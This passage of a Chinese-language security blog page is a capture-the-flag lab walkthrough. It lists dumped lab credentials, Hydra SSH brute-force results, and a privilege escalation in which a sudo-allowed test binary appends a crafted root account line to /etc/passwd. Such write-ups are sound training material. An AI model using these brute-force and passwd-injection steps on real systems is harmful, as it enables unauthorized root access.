<span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> jerrym    <span class="operator">|</span> Jerry     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">7</span>  <span class="operator">|</span> Flintstone <span class="operator">|</span> Pebbles       <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> wilmaf    <span class="operator">|</span> Wilma     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8</span>  <span class="operator">|</span> Rubble     <span class="operator">|</span> BamBam01      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> bettyr    <span class="operator">|</span> Betty     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">9</span>  <span class="operator">|</span> Bing       <span class="operator">|</span> UrAG0D<span class="operator">!</span>       <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> chandlerb <span class="operator">|</span> Chandler  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span> Tribbiani  <span class="operator">|</span> Passw0rd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> joeyt     <span class="operator">|</span> Joey      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> Green      <span class="operator">|</span> yN72#dsd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> rachelg   <span class="operator">|</span> Rachel    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> Geller     <span class="operator">|</span> ILoveRachel   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> rossg     <span class="operator">|</span> Ross      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">13</span> <span class="operator">|</span> Geller     <span class="operator">|</span> <span class="number">3248</span>dsds7s    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> monicag   <span class="operator">|</span> Monica    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span> Buffay     <span class="operator">|</span> smellycats    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> phoebeb   <span class="operator">|</span> Phoebe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15</span> <span class="operator">|</span> McScoots   <span class="operator">|</span> YR3BVxxxw87   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> scoots    <span class="operator">|</span> Scooter   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">16</span> <span class="operator">|</span> Trump      <span class="operator">|</span> Ilovepeepee   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> janitor   <span class="operator">|</span> Donald    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">17</span> <span class="operator">|</span> Morrison   <span class="operator">|</span> Hawaii<span class="operator">-</span>Five<span class="number">-0</span> <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">28</span> <span class="operator">|</span> janitor2  <span class="operator">|</span> Scott     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br></pre></td></tr></table></figure>
+
+<p>username.txt 可以用以下方式取得特定格式資料</p>
+<p><code>awk -F &quot;|&quot; &#39;NR&gt;2 &#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $4); gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $6); print $6&#125;&#39; UserDetails.db</code></p>
+<p><img src="/img/DC_Untitled_64.png" alt="Untitled"></p>
+<p>password.txt</p>
+<p><code>awk -F &quot;|&quot; &#39;NR&gt;2 &#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $4); gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $6); print $4&#125;&#39; UserDetails.db</code></p>
+<p><img src="/img/DC_Untitled_65.png" alt="Untitled"></p>
+<p>通過 SSH 服務使用 Hydra，提供兩個文件作為輸入。我們需要等待 Hydra 完成攻擊並列出有效密碼（如果找到的話）</p>
+<p><img src="/img/DC_Untitled_66.png" alt="Untitled"></p>
+<p>[22][ssh] host: 192.168.147.131   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.147.131   login: joeyt   password: Passw0rd<br>[22][ssh] host: 192.168.147.131   login: janitor   password: Ilovepeepee</p>
+<p>現在知道有三個組合可以登錄</p>
+<p>chandlerb 用戶登入後沒發現有趣的東西</p>
+<p><img src="/img/DC_Untitled_67.png" alt="Untitled"></p>
+<p>joeyt用戶也沒有東西</p>
+<p><img src="/img/DC_Untitled_68.png" alt="Untitled"></p>
+<p>在janitor用戶下看到了些機敏資料</p>
+<p><img src="/img/DC_Untitled_69.png" alt="Untitled"></p>
+<p>將這些密碼在拿去hydra以相同用戶爆破一次</p>
+<p><img src="/img/DC_Untitled_70.png" alt="Untitled"></p>
+<p>[22][ssh] host: 192.168.147.131   login: fredf   password: B4-Tru3-001<br>[22][ssh] host: 192.168.147.131   login: joeyt   password: Passw0rd</p>
+<p>將這些用戶嘗試權升級</p>
+<p>登入到fredf 使用 <code>sudo -l</code></p>
+<p><img src="/img/DC_Untitled_71.png" alt="Untitled"></p>
+<p><img src="/img/DC_Untitled_72.png" alt="Untitled"></p>
+<p>看起來二進製文件正在運行某種名為<em>test.py</em>的 Python 文件。讓我們使用<code>find</code>命令找到它：</p>
+<ul>
+<li><code>/</code>是開始掃描的根路徑</li>
+<li>-<code>type f</code>搜索文件（d 代表目錄）</li>
+<li>-<code>name &#39;test.py&#39;</code>文件名 flag.txt。我們也可以使用通配符，例如“flag”</li>
+<li><code>2&gt;/dev/null</code>這將產生更清晰的輸出，因為它將丟棄錯誤，例如權限錯誤。</li>
+</ul>
+<p><code>find / -name &quot;[test.py](http://test.py/)&quot; -type f 2&gt;/dev/null</code></p>
+<p><img src="/img/DC_Untitled_73.png" alt="Untitled"></p>
+<p>通過使用測試腳本將新記錄injecting&#x2F;concatinating到文件來添加新的<em><strong>root user</strong></em></p>
+<p>首先我們需要選擇一個密碼，加鹽並對結果進行hash處理。openssl 來救援。</p>
+<p>標誌：</p>
+<ul>
+<li><code>-1</code>使用什麼哈希算法。在我們的用例中，這並不重要，因此我們使用 MD5，在現實世界的 PT 中應避免使用 MD5，因為它不安全。</li>
+<li><code>-salt salt</code>用作鹽的string。我選擇string salt</li>
+<li><code>-password</code>我們想要使用的明文密碼。</li>
+</ul>
+<p><code>openssl passwd -1 -salt salt password</code></p>
+<p>openssl passwd: 這是 OpenSSL 工具中的一個子命令，用於生成密碼哈希。</p>
+<ul>
+<li>1: 這是一個選項，表示要使用 <strong>MD5 哈希算法生成密碼哈希</strong>。雖然 MD5 不再被視為安全的哈希算法，但在某些情況下仍然可以用於簡單的密碼散列。</li>
+<li>salt salt: 這是一個選項，用於指定用於哈希生成的鹽值。鹽是一個隨機字符串，可以增加密碼哈希的安全性。</li>
+</ul>
+<p>password: 這是要哈希的密碼。替換為您要哈希的實際密碼。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span>$<span class="number">1</span>$salt$qJH7.N4xYta3aEG<span class="operator">/</span>dfqo<span class="operator">/</span><span class="number">0</span><span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure>
+
+<p><code>vi /tmp/user</code> 先在tmp目錄下新增一個檔案叫user，並寫入以下內容</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hful:$<span class="number">1</span>$salt$qJH7.N4xYta3aEG<span class="operator">/</span>dfqo<span class="operator">/</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>::<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br></pre></td></tr></table></figure>
+
+<p>寫完後到執行.&#x2F;test的地方<code>/opt/devstuff/dist/test</code></p>
+<p><code>sudo ./test /tmp/user /etc/passwd</code> 並執行這命令</p>
+<p>然後cat &#x2F;etc&#x2F;passwd就會看到hful變成了允許的root身分(這裡我有寫錯內容所以才出來兩個)</p>
+<p><img src="/img/DC_Untitled_74.png" alt="Untitled"></p>
+<p>接下來到hful登入密碼是剛剛前面設定的password</p>
+<p><img src="/img/DC_Untitled_75.png" alt="Untitled"></p>
+<p>其他參考</p>
+<p><a target="_blank" rel="noopener" href="https://www.explainshell.com/explain?cmd=sudo+-l">explainshell.com - sudo -l</a></p>
+<hr>
+
+  </div>
+  
+  <div class="article-tags">
+    
+  </div>
+
+  
+
+</article>
+
+      <script>document.getElementById("loading-bar").style.width="60%";</script>
+    </main>
+    
+<footer id="footer" class="clearfix">
+	
+  <div>&copy; <a href="https://no-flag.com">HackThe4O4</a> Theme by <a href="http://artifact.me/" target="_blank">Art Chen</a>.</div>
+  <div>Powered by <a target="_blank" href="https://hexo.io/" rel="external noopener">Hexo</a>.</div>
+</footer>
+
+
+    <script>document.getElementById("loading-bar").style.width="80%";</script>
+    <div class="overlay"></div>
+  </div>
+  <div class="site-sidebar">
+
+	
+	
+	<div class="sidebar-switch clearfix "
+		style="display: none">
+		<a class="dark-btn active" data-toggle="toc">
+	    <span class="icon icon-list"></span>
+	    <span class="text">Index</span>
+	  </a>
+	  <a class="dark-btn" data-toggle="bio">
+	    <span class="icon icon-person"></span>
+	    <span class="text">Bio</span>
+	  </a>
+	</div>
+
+	<div class="site-toc "
+		style="display: none">
+		
+	    <div class="no-index">No Index</div>
+	  
+  </div>
+  
+	<div class="site-bio show"
+		style="display: block">
+		
+	  <!-- About Me -->
+	  <div class="about-me clearfix">
+	    <div class="avatar">
+	      <img src="/img/avatar.png" />
+	    </div>
+	    <div class="info">
+	      <a class="name dark-btn" href="/about">
+	        Noflag
+	      </a>
+	    </div>
+	    <div class="info">
+	      <span class="item desc">
+	        Documenting the journey of cyber security
+	      </span>
+	    </div>
+	  </div>
+	
+	  <!-- Social Icons -->
+	  <div class="social clearfix">
+	    
+	      
+	        <a href="/atom.xml" class="feed"
+	          target="_blank" rel="external">
+	          <span class="icon icon-feed"></span>
+	        </a>
+	      
+	        <a href="https://github.com/artchen" class="github"
+	          target="_blank" rel="external">
+	          <span class="icon icon-github"></span>
+	        </a>
+	      
+	    
+	  </div>
+
+	</div>
+
+	<div class="shortcuts">
+		<a href="#header" class="top window-nav dark-btn" id="go-top">
+			<span class="icon icon-chevron-thin-up"></span>
+		</a>
+		<a class="close dark-btn" id="sidebar-close">
+			<span class="icon icon-close"></span>
+		</a>
+		<a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+			<span class="icon icon-chevron-thin-down"></span>
+		</a>
+	</div>
+
+</div>
+
+  <!-- Universal Search -->
+
+<script type="text/javascript">
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var BAIDU_API_ID = "";
+  var SEARCH_SERVICE = "google";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.js"><\/script>')</script>
+
+
+<script src="/js/search.js"></script>
+
+
+<script src="/js/app.js"></script>
+
+
+<!-- Disqus -->
+
+
+
+<!-- Valine -->
+
+
+<!-- Swiftype -->
+<!-- Please replace with your own swiftype settings -->
+<!--
+<script type="text/javascript">
+  /* Swiftype */
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','FHMeAyBdVccJECstf-XJ','2.0.0');
+</script>
+-->
+
+  <script>document.getElementById("loading-bar").style.width="100%";</script>
+</body>
+</html>
